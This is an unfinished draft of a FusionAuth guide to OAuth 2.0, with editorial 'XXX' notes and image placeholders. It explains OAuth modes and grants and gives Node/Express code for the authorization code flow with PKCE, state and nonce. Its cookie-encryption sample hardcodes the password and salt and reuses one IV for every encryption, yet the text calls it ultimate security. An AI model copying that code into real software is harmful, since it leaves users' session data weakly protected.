---
layout: advice 
title: Modern Guide to OAuth 
description: Not just another OAuth tutorial. This guide walks you through all of the real use-cases of OAuth in clear and simple detail. 
image: advice/oauth-device-authorization-article.png 
author: Brian Pontarelli 
categories: oauth
date: 2020-10-06 
dateModified: 2020-10-06
---

I know what you are thinking, is this really another guide to OAuth 2.0? Well, yes and no. This guide is different than most of the others out there because it covers all of the ways that we actually use OAuth. It also covers all of the details you need to be an OAuth expert without reading all the specifications or writing your own OAuth server. This document is based on hundreds of conversations and multiple client and server implementations.

If that sounds good to you, keep reading! 

We do cover a lot, so here's a handy table of contents to let you jump directly to a section if you'd like.

* [OAuth overview](#oauth-overview)
* [OAuth modes](#oauth-modes)
  * [Local login and registration](#local-login-and-registration)
  * [Third-party login and registration](#third-party-login-and-registration)
  * [First-party login and registration](#first-party-login-and-registration)
  * [Enterprise login and registration](#enterprise-login-and-registration)
  * [Third-party service authorization](#third-party-service-authorization)
  * [First-party service authorization](#first-party-service-authorization)
  * [Machine-to-machine authorization](#machine-to-machine-authorization)
  * [Device login and registration](#device-login-and-registration)
  * [Which mode is right for you?](#which-mode-is-right-for-you)
* [Grants](#grants)
  * [Authorization code grant](#authorization-code-grant)
  * [Implicit grant](#implicit-grant)
  * [Resource Owner's Password Credentials Grant](#resource-owners-password-credentials-grant)
  * [Client Credentials Grant](#client-credentials-grant)
  * [Device Grant](#device-grant)
* [Conclusion](#conclusion)

## OAuth overview

OAuth 2.0 is a set of specifications that allow developers to easily delegate the authentication and authorization of their users to someone else. While the specifications don't specifically cover authentication, in practice this is a core piece of OAuth, so we will cover it in depth (because that's how we roll).

What does that mean? It means that your application sends the user over to an OAuth server, they login, and then are sent back to your application. However, there are a couple of different situations and end results of this process that we will cover in the next section.

## OAuth modes

None of the specifications cover how OAuth is actually integrated into applications. XXX but as a developer, that's what you care about. XXX They also don't cover the different workflows or processes that leverage OAuth. They leave almost everything up to the implementor (the person that writes the OAuth Server) and integrator (the person that integrates their application with the OAuth server). Rather than just reword the information in the specifications (yet again), let's create a vocabulary for real-world integrations and implementations of OAuth. We'll call them **OAuth modes**.

There are eight OAuth modes that are commonly used today. These real world OAuth modes are:

1. Local login and registration
1. Third-party login and registration _(federated identity)_
1. First-party login and registration _(reverse federated identity)_
1. Enterprise login and registration _(federated identity with a twist)_
1. Third-party service authorization
1. First-party service authorization
1. Machine-to-machine authentication and authorization
1. Device login and registration

I've included notation on a few of the items above specifying which are federated identity workflows. The reason that I've changed the names here from just "federated identity" is that each case is slightly different. Plus, the term federated identity is often overloaded and mis-understood. To help clarify terms, I'm using "login" instead. However, this is generally the same as "federated identity" in that the user's identity is stored in an OAuth server and the authentication/authorization is delegated to that server.

Let's discuss each mode in a bit more detail, but first, a cheat sheet.

### Which mode is right for you?

Wow, that's a lot of different ways you can use OAuth. That's the power and the downfall of OAuth, to be honest with you. It can serve so many purposes that many people new to it can be overwhelmed.

So, here's a handy set of questions for you to ask yourself.

* Are you building service to service communication? Is there no user involved? If so, you are looking for [Machine-to-machine authorization](#machine-to-machine-authorization).
* Are you trying to let a user log in from a separate device? That is, from a TV or other device without a friendly typing interface? If this is the case, check out [Device login and registration](#device-login-and-registration).
* Are you building a platform and want to allow other developers to ask for permissions to make calls to APIs or services on your platform? Put on your hoodie and review [First-party login and registration](#first-party-login-and-registration) and [First-party service authorization](#first-party-service-authorization).
* Do you have a user store already integrated and only need to access a third party service on your users' behalf? Re-read [Third-party service authorization](#third-party-service-authorization).
* Are you selling to Enterprise customers? Folks who hear terms like SAML and SOC2 and are comforted, rather than disturbed? Scoot on over to [Enterprise login and registration](#enterprise-login-and-registration).
* Trying to avoid storing password credentials locally because you don't want to any responsibility for passwords? [Third-party login and registration](#third-party-login-and-registration) is where it's at.
* Are you looking to build a safe, secure and standards friendly authentication and authorization system? You'll want [Local login and registration](#local-login-and-registration) in that case.

### Local login and registration

The **Local login and registration** mode is when you are using an OAuth workflow to register or log users into your application. In this mode, you own both the OAuth server and the application. You might not have written the OAuth server, but you control it (like using a product such as FusionAuth). In fact, this mode usually feels like the user is signing up or logging directly into your application via native forms and there is no delegation at all.

What do we mean by native forms? Most developers have at one time written their own login and registration forms directly into an application. They create a table called `users` and it stores the `username` and `password`. Then they write the registration and the login forms (HTML or some other UI). The registration form collects the `username` and `password` and checks if the user exist in the database. If they don't, the application inserts the new user into the database. The login form collects the `username` and `password` and checks if it exists in the database and logs the user in if it does. This type of implementation is what we call native forms.

The only difference between native forms and the **Local login and registration** OAuth mode is that you delegate the login and registration process to an OAuth server rather than writing everything by hand. Additionally, since you control the OAuth server and your application, it would be odd to ask the user to "authorize" your application. Therefore, this mode does not include the permission grant screens that we'll cover in the next few modes.

So, how does this work in practice? Let's take a look at the steps for a fictitious web application called "The World's Greatest ToDo List" or "TWGTL" (pronounced Twig-Til):

1. A user visits TWGTL and wants to sign up and manage their ToDos.
1. They click the "Sign Up" button on the homepage.
1. This button takes them over to the OAuth server. In fact, it takes them directly to the registration form that is part of the OAuth workflow (specifically the Authorization Code Grant which is covered later in this guide). XXX
1. They fill out the registration form and click "Submit".
1. The OAuth server ensures this is a new user and creates their account.
1. The OAuth server redirects the browser back to TWGTL, which logs the user in.
1. The user begins using TWGTL and adds their current ToDos. Yay!
1. Later, the user comes back to TWGTL and needs to sign in to check off some of their ToDos. They click the `My Account` link at the top of the page.
1. This takes the user to the OAuth server's login page.
1. The user types in their username and password.
1. The OAuth server confirms their identity.
1. The OAuth server redirects the browser back to TWGTL, which logs the user in.

That's it. The user feels like they are registering and logging into TWGTL directly, but in fact, TWGTL is delegating this all to the OAuth server. The user is none-the-wiser so this is why we call this mode *Local login and registration*.

<<IMAGE OR VIDEO HERE MAYBE?>>

This mode has implications for some of the security best practices. In particular, the [OAuth 2.0 for Native Apps](https://tools.ietf.org/html/rfc8252) Best Current Practices (BCP) recommends against using a webview:

> This best current practice requires that native apps MUST NOT use embedded user-agents to perform authorization requests...

This is because the "embedded user-agents", also known as webviews, are under control of the mobile application developer in a way that the system browser is not. 

If you are operating in a mode where the OAuth server is under a different party's control, such as the third-party login that we'll cover next, this prohibition makes sense. But in the local mode, you control everything. In that case, the chances of a malicious webview being able to do extra damage is minimal, and must be weighed against the user interface issues associated with popping out to a system browser for authentication.

### Third-party login and registration

The **Third-party login and registration** mode is implemented with the classic "Login with ..." buttons you see in many applications. These buttons let users sign up or log into your application by logging into one of their other accounts (i.e. Facebook or Google). Here, your application sends the user over to Facebook or Google to log in.

Let's use Facebook as an example OAuth provider. In most cases, your application will need to use one or more APIs from the OAuth provider in order to retrieve information about the user or do things on behalf of the user (for example sending a message on behalf of the user). In order to use those APIs, the user has to grant your application permissions to do so. To accomplish this, the third-party service usually shows the user a screen that asks for certain permissions.

Facebook will present a screen that might ask the user to share their email address with your application. Once the user grants these permissions, your application can call the Facebook APIs using an access token (which we will cover in detail later in this guide XXX ). We'll refer to these screens as the "permission grant screen" throughout the rest of the guide.

Here's an example of the Facebook permission grant screen:

<<IMAGE>>

After the user has logged into the third-party OAuth server and granted your application permissions, they are redirected back to your application and logged into it.

This mode is different from the previous mode because t the user was both logged in, but also granted your application permissions to the service (i.e. Facebook). This is why so many applications leverage the "Login with Facebook" or other social integrations. It not only logs the user in, but also gives them access to call the Facebook APIs on the user's behalf.

**NOTE:** Social logins are the most common examples of this, but there are plenty of other third-party OAuth servers outside of social networks (GitHub for example).

This mode is a good example of federated identity. Here, the user's identity (username and password) is stored in the third-party system and they are using that system to register or log into your application.

So, how does this work in practice? Let's take a look at the steps for our TWGTL application to use Facebook to register and log users in:

1. A user visits TWGTL and wants to sign up and manage their ToDos.
1. They click the "Sign Up" button on the homepage.
1. On the login screen, the user clicks the "Login with Facebook" button.
1. This button takes them over to Facebook's OAuth server.
1. They log into Facebook (if they aren't already logged in).
1. Facebook presents the user with the permission grant screen based on the permissions TWGTL needs. This is done using OAuth scopes, which we will cover later in this guide. XXX
1. Facebook redirects the browser back to TWGTL, which logs the user in. TWGTL also calls the Facebook API to retrieve the user's information.
1. The user begins using TWGTL and adds their current ToDos.
1. Later, the user comes back to TWGTL and needs to sign in to check off some of their ToDos. They click the `My Account` link at the top of the page.
1. This takes the user to the TWGTL login screen that contains the "Login with Facebook" button.
1. This takes the user back to Facebook and they repeat the same process as above.

You might be wondering if the **Third-party login and registration** mode can work with the **Local login and registration** mode. Absolutely! This is what I like to call **Nested federated identity** (it's like a [hot pocket in a hot pocket](https://www.youtube.com/watch?v=N-i9GXbptog)). Basically, your application delegates its registration and login forms to an OAuth server like FusionAuth. It also allows users to optionally sign in with Facebook by enabling that feature of the OAuth server (FusionAuth calls this the **Facebook Identity Provider**). It's a little more complex, but the flow looks something like this:

1. A user visits TWGTL and wants to sign up and manage their ToDos.
1. They click the "Sign Up" button on the homepage.
1. This button takes them over to the OAuth server's login page.
1. On this page, there is an button to "Login with Facebook" and the user clicks that.
1. This button takes them over to Facebook's OAuth server.
1. They log into Facebook.
1. Facebook presents the user with the permission grant screen.
1. Facebook redirects the browser back to TWGTL's OAuth server, which reconciles out the user's account. XXX what does reconcile out mean? copies over data, makes sure the user exists, etc? This is the first use of that
1. TWGTL's OAuth server redirects the user back to the TWGTL application.
1. The user is logged into TWGTL.

The nice part about this workflow is that TWGTL doesn't have to worry about integrating with Facebook (or any other provider) or reconciling the user's account. That's all handled by the OAuth server. It's also possible to delegate to additional OAuth servers, easily adding Login with Google. You can also nest deeper than the 2 levels illustrated here.

### First-party login and registration

The **First-party login and registration** mode is the inverse of the **Third-party login and registration** mode. Basically, if you happen to be Facebook in the examples above and your customer is TWGTL, you are providing the OAuth server to TWGTL. You are also providing a way for them to call your APIs on behalf of your users. 

This type of setup is not just reserved for the massive social networks run by Silicon Valley moguls; more and more companies are offering this service to their customers and partners and becoming platforms. In many cases, companies are also leveraging easily integratable auth systems products like FusionAuth to provide this feature.

### Enterprise login and registration

The **Enterprise login and registration** mode is when your application allows users to sign up or log in with an enterprise identity provider such as a corporate Active Directory. This mode is very similar to the **Third-party login and registration** mode with a few differences. 

First, it rarely requires the user to grant permissions to your application using a permission grant screen. Instead, the user does not have the option to grant or restrict permissions for your application. The permissions are usually managed by IT in an enterprise directory (Active Directory for example) or in your application directly.

Second, this mode does not apply to all users of an application. In most cases, this mode is only available to a subset of users who exist in the enterprise directory. The rest of your users will either login directly to your application using **Local login and registration** or through the **Third-party login and registration** mode. In some cases, the user's email address is used to determine how they are logged in. You might have noticed some login forms that only ask for your email on the first step like this:

<<IMAGE>>

Knowing a user's email domain allows the OAuth server to determine where to send the user to log in or if they should log in locally. If you work at Example Company, proud purveyers of TWGTL, providing `brian@example.com` to the login screen allows the OAuth server to know you are an employee.

Outside of these differences, this mode behaves the same as the **Third-party login and registration** mode.

This is the final mode where users can register and login to your application. The remaining modes are used entirely for authorization, usually to application programming interfaces (APIs). We'll cover those next.

### Third-party service authorization

The third-party service authorization mode is quite different than the **Third-party login and registration** mode. Here, the user is already logged into your application. The login could have been through a native form (that we discussed above) or using the **Local login and registration** mode, the **Third-party login and registration** mode, or the **Enterprise login and registration** mode. Since the user is already logged in, all they are doing is granting access for your application to call a third-party's APIs.

For example, let's say a user has an account with TWGTL, but each time they complete a ToDo, they want to let their [WUPHF](https://www.youtube.com/watch?v=yL1z1ZHD0K4) followers know. (WUPHF is an up and coming social network.) To accomplish this, TWGTL provides a WUPHF integration that will automatically send a WUPHF when the user completes a ToDo. The integration uses the WUPHF APIs and those require an access token to call. In order to get an access token, the TWGTL application needs to log the user into WUPHF via OAuth.

To hook all of this up, TWGTL needs to add a button to the user's profile page that says "Connect your WUPHF account". Notice it doesn't say "Login with WUPHF" since the user is already logged in; the user's identity for TWGTL isn't delegated to WUPHF. Once the user clicks this button, they will be taken to WUPHF's OAuth server to login and grant the necessary permissions for TWGTL to WUPHF for them.

<<IMAGE MAYBE>>

The workflow for this mode looks like this:

1. A user visits TWGTL and logs into their account.
1. They click the "My Profile" link.
1. On their account page, they click the "Connect your WUPHF account" button.
1. This button takes them over to WUPHF's OAuth server.
1. They log into WUPHF.
1. WUPHF presents the user with the "permission grant screen" and asks if TWGTL can WUPHF on their behalf.
1. The user grants TWGTL this permission.
1. WUPHF redirects the browser back to TWGTL where it calls WUPHF's OAuth server to get an access token.
1. TWGTL stores the access token in its database and can now call WUPHF APIs on behalf of the user.

### First-party service authorization

The **First-party service authorization** mode is the inverse of the **Third-party service authorization** mode. This is when another application wishes to call your APIs on behalf of one of your users. Here, your application is the "third-party service" we discussed above and asks the user if they want to grant the other application specific permissions. Basically, if you are building the next Facebook and want developers to be able to call your APIs on behalf of their users, you'll need to support this OAuth mode.

With this mode, your OAuth server might display a "permission grant screen" to the user that asks if they want to grant the third-party application permissions to your APIs. This isn't strictly required and depends on your requirements.

### Machine-to-machine authorization

The **Machine-to-machine authorization** OAuth mode is different than the previous modes we've covered. This mode does not involve users at all. Rather, it allows an application to interact with another application. Normally, this is via backend services communicating with each other via APIs.

<<IMAGE MAYBE>>

Here, one backend needs to be granted access to the other backend. We'll call the first backend the source and the second backend the target. To accomplish this, the source authenticates with the OAuth server. The OAuth server confirms the identity of the source and then returns a token that the source will use to call the target. This process can also include permissions that are used by the target to authorize the call the source is making.

Using our TWGTL example, let's say that TWGTL has 2 microservices: one to manage ToDos and another to send WUPHFs. The ToDo microservice needs to call the WUPHF microservice. The WUPHF microservice needs to ensure that any caller is allowed to call its APIs. The workflow for this looks like this:

1. The ToDo microservice authenticates with the OAuth server.
1. The OAuth server returns a token to the ToDo microservice.
1. The ToDo microservice calls an API in the WUPHF microservice and includes the token in the request.
1. The WUPHF microservice verifies the token by calling the OAuth server (or verifying it on its own if the token is a JWT).
1. If the token is valid, the WUPHF microservice performs the operation.

### Device login and registration

The **Device login and registration** mode is used to login (or register) to a user's account on a device that doesn't have a rich input device like a keyboard. In this case, a user wants to connect the device to their account, usually to ensure their account is active and the device is allowed to use their account.

A good example of this mode is setting up a streaming app on an Apple TV, smart TV, or other device such as a Roku. In order to ensure you have a subscription to the streaming service, the app needs to verify the user's identity and connect to their account. The app on the Apple TV device displays a code and a URL and asks the user to visit the URL. The workflow for this mode is as follows:

1. The user opens the app on the Apple TV.
2. The app displays a code and a URL.
3. The user types in the URL displayed by the Apple TV on their phone or computer.
4. The user is taken to the OAuth server and asked for the code.
5. The user submits this form and is taken to the login page.
6. The user logs into the OAuth server.
7. The user is taken to a "Finished" page.
8. A few seconds later, the device is connected to the user's account.

This mode often takes a bit of time to complete because the app on the Apple TV is polling the OAuth server. We won't go over this mode in detail because our [OAuth Device Authorization article](/learn/expert-advice/oauth/oauth-device-authorization/) covers this mode.


## Grants

Now that we have covered the real world OAuth modes, let's dig into how these are actually implemented using the OAuth grants. OAuth grants are:

* Authorization Code Grant
* Implicit Grant
* Resource Owner's Password Credentials Grant
* Client Credentials Grant
* Device Grant

We'll cover each grant type below and discuss how it is used, or not, for each of the OAuth modes above.

### Authorization code grant

This is the most common OAuth grant and also the most secure. It relies on a user interacting with a browser (Chrome, Firefox, Safari, etc.) in order to handle OAuth modes 1 though 6 above. This grant requires the interaction of a user, so it isn't usable for the **Machine-to-machine authorization** mode. All of the interactive modes we covered above involve the same parties and UI, except when a "permission grant screen" is displayed. 

A few terms we need to define before we dive into this grant.

* **Authorize endpoint:** This is the location that starts the workflow and is a URL that the browser is taken to. Normally, users register or login at this location.
* **Authorization code:** This is a random string of printable ASCII characters that the OAuth server includes in the redirect after the user has registered or logged in. This is used by the application backend and exchanged for tokens.
* **Token endpoint:** This is an API that is used to get tokens from the OAuth server after the user has logged in. The application backend uses the **Authorization code** when it calls the **Token endpoint**.

In this section we will also cover PKCE (Proof Key for Code Exchange - pronounced Pixy). PKCE is a security layer that sits on top of the authorization code grant to ensure that authorization codes can't be stolen or reused. The basics of PKCE is that the application generates a secret key (called the code verifier) and hashes it using SHA 256. This hash is one-way, so it can't be reversed by an attacker. The application then sends the hash to the OAuth server, which stores it. Later, when the application is getting tokens from the OAuth server, the application will send the server the secret key and the OAuth server will verify that the hash of the provided secret key matches the previously provided value. This is a good protection against attackers that can intercept the authorization code, but don't have the secret key.

**NOTE:** PKCE is not required for standard web browser uses of OAuth with the Authorization Code Grant when the application backend is passing both the `client_id` and `client_secret` to the Token endpoint. We will cover this in more detail below XXX, but depending on your implementation, you might be able to safely skip implementing PKCE. I recommend always using it, but it isn't always required.

Let's take a look at how you implement this grant using a prebuilt OAuth server (like FusionAuth).

#### Login/register buttons

First, we need to add a "Login" or "My Account" link/button to our application; or if you are using one of the authorization modes from above (for example the **Third-party service authorization** mode), you'll add a "Connect to XYZ" link/button. There are two ways to connect this link/button to the OAuth server:

1. Set the `href` of the link to the full URL that starts the OAuth authorization code grant.
2. Set the `href` to a controller in the application backend that does a redirect.

Option #1 is an older integration that is often not used in practice. There are a couple of reasons for this. First, the URL is long and not all that nice looking. Second, if you are going to use any enhanced security measures like PKCE and `nonce`, you'll need to write code that generates extra pieces of data to include on the redirect. We'll cover PKCE and OpenID Connect's `nonce` parameter as we set up our application integration.

Before we dig into option #2, let's quickly take a look at how option #1 works.

First, you'll need to determine the URL that starts the authorization code grant with your OAuth server as well as include all of the necessary parameters required by the specification. We'll use FusionAuth as an example, since it has a consistent URL pattern. Let's say you are running FusionAuth and it is deployed to `https://login.twgtl.com`. The URL for the OAuth authorize endpoint will also be located at:

```
https://login.twgtl.com/oauth2/authorize
```

Next, you would insert this URL with a bunch of parameters (which we will go over below) into an anchor tag like this:

```html
<a href="https://login.twgtl.com/oauth2/authorize?[a bunch of parameters here]">Login</a>
```

This anchor tag would take the user directly to the OAuth server to start the authorization code grant. As we discussed above, this method is not generally used. 

Let's take a look at how Option #2 is implemented instead. Don't worry, you'll still get to learn about all those parameters.

Rather than point the anchor tag directly at the OAuth server, we'll point it at the TWGTL backend instead. To make everything work, we need to write code that will handle the request for `/login` and redirect the browser to the OAuth server. Here's our updated anchor tag that points at the backend controller:

```html
<a href="https://app.twgtl.com/login">Login</a>
``` 

Next, we need to write the controller for `/login` in the application. Here's a simple JavaScript snippet using NodeJS/Express that accomplishes this:

```javascript
router.get('/login', function(req, res, next) {
  res.redirect(302, 'https://login.twgtl.com/oauth2/authorize?[a bunch of parameters here]');
});
```

You can view all the [code in this guide in the accompanying GitHub repository](https://github.com/FusionAuth/fusionauth-example-modern-guide-to-oauth).

#### Authorize endpoint parameters

This code immediately redirects the browser to the OAuth server. However, if you ran this code and clicked the link, the OAuth server will reject the request because it doesn't contain the required parameters to be valid. The parameters that are defined in the OAuth specifications are:

* `client_id` - this identifies the application you are logging into. In OAuth, this is referred to as the `client`. This value will be provided to you by the OAuth server.
* `redirect_uri` - this is the URL in your application that the OAuth server will redirect the user back to after they log in. This URL must be registered with the OAuth server and it must point to a controller in your app (rather than a static page), because your app must do additional work after this URL is called.
* `state` - technically this is optional, but it is useful for preventing various security issues. This parameter is echoed back to your application by the OAuth server. It can be anything you might need to be persisted across the OAuth workflow. If you have no other need for this parameter, I suggest setting it to a large randomly generated string. If you need to have data persisted across the workflow, I suggest setting URL encoding the data and appending a random string.
* `response_type` - this should always be set to `code` for this grant type. This tells the OAuth server you are using the authorization code grant.
* `scope` - this is also an optional parameter, but in some of the above modes, this will be required by the OAuth server. This parameter is a space separated list of strings. You might also need to include the `offline` scope in this list if you plan on using refresh tokens in your application (we'll cover this later in the guide as well XXX).
* `code_challenge` - this an optional parameter, but provides support for PKCE. This is useful when there is not a backend that can handle the final steps of the Authorization Code Grant. This is known as a "public client". There aren't many cases of applications that specifically don't have backends, but if you have something like a mobile application and you aren't able to leverage a server-side backend for OAuth, you must implement PKCE to protect your application from security issues. The security issues surrounding PKCE are out of the scope of this guide, but you can find numerous articles online about them and PKCE is recommended by the [OAuth 2.1 draft](https://fusionauth.io/learn/expert-advice/oauth/differences-between-oauth-2-oauth-2-1/).
* `code_challenge_method` - this is an optional parameter, but if you implement PKCE, you must specify how your PKCE `code_challenge` parameter was create. It can either be `plain` or `S256`. We never recommend using anything except `S256` which uses SHA-256 secure hashing for PKCE.
* `nonce` - this is an optional parameter and is used for OpenID Connect. We don't go into much detail of OpenID Connect in this guide, but we will cover a few aspects including ID tokens and the `nonce` parameter. Basically, this `nonce` parameter will be included in the ID token that the OAuth server generates and we can verify that when we retrieve the ID token later in the guide.

Let's update our controller from above with all of these values. While we don't actually need to use PKCE for this guide, it doesn't hurt anything to add it.

```javascript
const clientId = '9b893c2a-4689-41f8-91e0-aecad306ecb6';
const redirectURI = encodeURI('https://app.twgtl.com/oauth-callback');
const scopes = encodeURIComponent('profile offline_access openid');

router.get('/login', (req, res, next) => {
  const state = generateAndSaveState(req, res);
  const codeChallenge = generateAndSaveCodeChallenge(req, res);
  const nonce = generateAndSaveNonce(req, res);
  res.redirect(302,
               'https://login.twgtl.com/oauth2/authorize?' +
                 `client_id=${clientId}&` +
                 `redirect_uri=${redirectURI}&` +
                 `state=${state}&` +
                 `response_type=code&` +
                 `scope=${scopes}&` +
                 `code_challenge=${codeChallenge}&` +
                 `code_challenge_method=S256&` +
                 `nonce=${nonce}`);
});
```

You'll notice that we have specified the `client_id`, which was likely provided to us by the OAuth server, the `redirect_uri`, which is part of our application, and a `scope` with the values `profile`, `offline_access`, and `openid` (space separated). These are all usually hardcoded values since they rarely change in practice. The other values change each time we make a request and are being generated in the controller.

The `scope` parameter is used by the OAuth server to determine what authorization the application is requesting. There are a couple of standard values that are defined as part of OpenID Connect. These scopes include `profile`, `offline_access` and `openid`. The OAuth specification does not define any standard scopes, but most OAuth servers support numerous values for this parameter. You should consult with your OAuth server to determine the scopes you'll need to pass. 

Here are definitions of the standard scopes in the OpenID Connect specification:

* `openid` - tells the OAuth server to use OpenID Connect for the handling of the OAuth workflow. This additionally will tell the OAuth server to return an ID token from the Token endpoint (covered below XXX)
* `offline_access` - tells the OAuth server to generate and return a refresh token from the Token endpoint (covered below XXX)
* `profile` - tells the OAuth server to include all of the standard OpenID Connect claims in the returned tokens (access and/or id tokens)
* `email` - tells the OAuth server to include the user's email in the returned tokens (access and/or id tokens)
* `address` - tells the OAuth server to include the user's address in the returned tokens (access and/or id tokens)
* `phone` - tells the OAuth server to include the user's phone number in the returned tokens (access and/or id tokens)

In order to properly implement the handling for the `state`, PKCE, and `nonce` parameters, we need to save these values off somewhere they will be persisted across browser requests and redirects. There are two options for this:

1. Store the values in a server-side session.
2. Store the values in secure, http-only cookies (preferably encrypted).

You might choose cookies if you are building a SPA and want a simpler server. Here is an excerpt of the login route from above.

```javascript
//...
router.get('/login', (req, res, next) => {
  const state = generateAndSaveState(req, res);
  const codeChallenge = generateAndSaveCodeChallenge(req, res);
  const nonce = generateAndSaveNonce(req, res);
//...
```

Let's cover both of these options. First, let's write the code for each of the `generate*` functions and store the values in a server-side session: XXX not in the code

```javascript
const crypto = require('crypto');

// Helper method for Base 64 encoding that is URL safe
function base64URLEncode(str) {
  return str.toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

function sha256(buffer) {
  return crypto.createHash('sha256')
    .update(buffer)
    .digest();
}

function generateAndSaveState(req) {
  const state = base64URLEncode(crypto.randomBytes(64));
  req.session.oauthState = state;
  return state;
}

function generateAndSaveCodeChallenge(req) {
  const codeVerifier = base64URLEncode(crypto.randomBytes(64));
  req.session.oauthCode = codeVerifier;
  return base64URLEncode(sha256(codeVerifier));
}

function generateAndSaveNonce(req) {
  const nonce = base64URLEncode(crypto.randomBytes(64));
  req.session.oauthNonce = nonce;
  return nonce;
}
```

This code is using the `crypto` library to generate random bytes and converting those into URL safe strings. Each method is storing the values created in the session. You'll also notice that in the `generateAndSaveCodeChallenge` we are also hashing the random string using the `sha256` function. This is how PKCE is implemented such that the code verifier is saved in the session and the hashed version of it is sent as a parameter to the OAuth server.

Here's the same code (minus the require and helper methods) modified to store each of these values in secure, HTTP only cookies:

```javascript
function generateAndSaveState(req, res) {
  const state = base64URLEncode(crypto.randomBytes(64));
  res.cookie('oauth_state', state, {httpOnly: true, secure: true});
  return state;
}

function generateAndSaveCodeChallenge(req, res) {
  const codeVerifier = base64URLEncode(crypto.randomBytes(64));
  res.cookie('oauth_code_verifier', codeVerifier, {httpOnly: true, secure: true});
  return base64URLEncode(sha256(codeVerifier));
}

function generateAndSaveNonce(req, res) {
  const nonce = base64URLEncode(crypto.randomBytes(64));
  res.cookie('oauth_nonce', nonce, {httpOnly: true, secure: true});
  return nonce;
}
```

You might be wondering if it is safe to be storing these values in cookies since the cookies will be sent back to the browser. We are setting each of these cookies to `httpOnly` and `secure`. These flags ensure that no malicious code in the browser (i.e. JavaScript) can read their values. If you want to secure this even further, you can also encrypt the values like this:

```javascript
const password = 'setec-astronomy'
const key = crypto.scryptSync(password, 'salt', 24);
const iv = crypto.randomBytes(16);

function encrypt(value) {
  const cipher = crypto.createCipheriv('aes-192-cbc', key, iv);
  let encrypted = cipher.update(value, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted + ':' + iv.toString('hex');
}

function generateAndSaveState(req, res) {
  const state = base64URLEncode(crypto.randomBytes(64));
  res.cookie('oauth_state', encrypt(state), {httpOnly: true, secure: true});
  return state;
}

function generateAndSaveCodeChallenge(req, res) {
  const codeVerifier = base64URLEncode(crypto.randomBytes(64));
  res.cookie('oauth_code_verifier', encrypt(codeVerifier), {httpOnly: true, secure: true});
  return base64URLEncode(sha256(codeVerifier));
}

function generateAndSaveNonce(req, res) {
  const nonce = base64URLEncode(crypto.randomBytes(64));
  res.cookie('oauth_nonce', encrypt(nonce), {httpOnly: true, secure: true});
  return nonce;
}
```

Encryption is generally not needed, specifically for the `state` and `nonce` parameters since those are sent as plaintext on the redirect anyways, but if you need ultimate security and want to use cookies, this is the best way to secure these values.

#### Logging in

At this point, the user will be taken over to the OAuth server to login (or register). Technically, the OAuth server can manage the login and registration process however it needs. In some cases, a login won't be necessary because the user will already be authenticated with the OAuth server or they can be authenticated by other means (smart cards, hardware devices, etc).

The OAuth 2.0 specification doesn't specify anything about this process. Not a word!

In practice though, 99.999% of OAuth servers use a standard login page that collects the user's username and password. We'll assume that the OAuth server provides a standard login page and handles the collection of the user's credentials and verification of their validity.

#### Redirect and retrieve the tokens

After the user has logged in, the OAuth server redirects the **browser** back to the application. The exact location of the redirect is controlled by the `redirect_uri` parameter that we passed on the URL above. In our example, this location is `https://app.twgtl.com/oauth-callback`. When the OAuth server redirects the browser back to this location, it will add a few parameters to the URL. These are:

* `code` - this is the authorization code that the OAuth server created after the user was logged in. We'll exchange this code for tokens.
* `state` - this is the same value of the `state` parameter we passed to the OAuth server. This is echoed back to the application so that the application can verify that the `code` came from the correct location.

OAuth servers can add additional parameters as needed, but these are the only ones defined in the specifications. A full redirect URL might look like this:

```
https://app.twgtl.com/oauth-callback?code=123456789&state=foobarbaz
```

Remember that the browser is going to make an HTTP `GET` request to this URL. In order to securely complete the OAuth authorization code grant, you should write a server-side controller that handles this URL. This will allow you to securely exchange the authorization `code` parameter for tokens. 

Let's look at how a controller accomplishes this exchange.

First, we need to know the location of the OAuth server's Token endpoint. This is an API that the OAuth server provides that will validate the authorization `code` and exchange it for tokens. We are using FusionAuth as our example OAuth server and it has a consistent location for the Token endpoint. (Other OAuth servers may have a different or varying location; consult your documentation.) In our example, that location will be `https://login.twgtl.com/oauth2/token`.

We will need to make an HTTP `POST` request to the Token endpoint using form encoded data values for a number of parameters. Here are the parameters we need to send to the Token endpoint:

* `code` - this is the authorization code we are exchanging for tokens.
* `client_id` - this is client id that identifies our application.
* `client_secret` - this is a secret key that is provided by the OAuth server. This should never be made public and should only ever be stored in your application on the server.
* `code_verifier` - this is code verifier value we created above and either stored in the session or in a cookie.
* `grant_type` - this will always be the value `authorization_code` to let the OAuth server know we are sending it an authorization code.
* `redirect_uri` - this is the redirect URI that we sent to the OAuth server above.

Here's a NodeJS controller that calls the Token endpoint using these parameters. It also verifies the `state` parameter is correct along with the `nonce` that should be present in the `id_token`. It also restores the saved `codeVerifier` and passes that to the Token endpoint to complete the PKCE handling.

```javascript
// Dependencies
const express = require('express');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const common = require('./common');
const config = require('./config');

// Route and OAuth variables
const router = express.Router();
const clientId = config.clientId;
const clientSecret = config.clientSecret;
const redirectURI = encodeURI('http://localhost:3000/oauth-callback');
const scopes = encodeURIComponent('profile offline_access openid');

// Crypto variables
const password = 'setec-astronomy'
const key = crypto.scryptSync(password, 'salt', 24);
const iv = crypto.randomBytes(16);

//
router.get('/oauth-callback', (req, res, next) => {
  // Verify the state
  const reqState = req.query.state;
  const state = restoreState(req, res);
  if (reqState !== state) {
    res.redirect('/', 302); // Start over
    return;
  }
  
  const code = req.query.code;
  const codeVerifier = restoreCodeVerifier(req, res);
  const nonce = restoreNonce(req, res);

  // POST request to Token endpoint
  const form = new FormData();
  form.append('client_id', clientId);
  form.append('client_secret', clientSecret)
  form.append('code', code);
  form.append('code_verifier', codeVerifier);
  form.append('grant_type', 'authorization_code');
  form.append('redirect_uri', redirectURI);
  axios.post('https://login.twgtl.com/oauth2/token', form, { headers: form.getHeaders() })
    .then((response) => {
      const accessToken = response.data.access_token;
      const idToken = response.data.id_token;
      const refreshToken = response.data.refresh_token;

      if (idToken) {
        let user = common.parseJWT(idToken, nonce);
          if (!user) {
            console.log('Nonce is bad. It should be ' + nonce + ' but was ' + idToken.nonce);
            res.redirect(302,"/"); // Start over
            return;
          }
      }


      // Since the different OAuth modes handle the tokens differently, we are going to
      // put a placeholder function here. We'll discuss this function in the following
      // sections
      handleTokens(accessToken, idToken, refreshToken, res);
    }).catch((err) => {console.log("in error2"); console.error(JSON.stringify(err));});
});


function restoreState(req) {
  return req.session.oauthState; // Server-side session
}
